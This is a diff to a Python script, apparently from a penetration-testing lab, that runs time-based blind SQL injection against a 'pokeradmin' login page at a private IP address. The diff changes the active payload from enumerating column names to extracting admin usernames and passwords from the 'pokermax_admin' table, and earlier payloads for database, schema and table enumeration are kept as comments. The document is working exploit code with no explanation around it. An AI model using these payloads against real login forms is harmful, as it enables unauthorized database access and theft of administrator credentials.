@@ -13,7 +13,7 @@ def sqli():
     data=""
     IP_victima = "192.168.100.27"
     URL = "http://"+IP_victima+"/pokeradmin/index.php"
-    characters = string.ascii_letters + string.digits + "_-,"
+    characters = string.ascii_letters + string.digits + "_-,:"
 
     cabeceras = {
         "Content-Type": "application/x-www-form-urlencoded"
@@ -33,7 +33,9 @@ def sqli():
                 #"username": f"admin' and if(substr(database(),{position},1)='{i}',sleep(0.9),1)-- -",
                 #"username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
                 #"username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
-                "username": f"admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -",
+                #"username": f"admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -",
+                "username": f"admin' and if(substr((select group_concat(username,0x3a,password) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -",
+                
                 "password": "SAD" 
             }
             l3.status(f"{post_data['username']}")
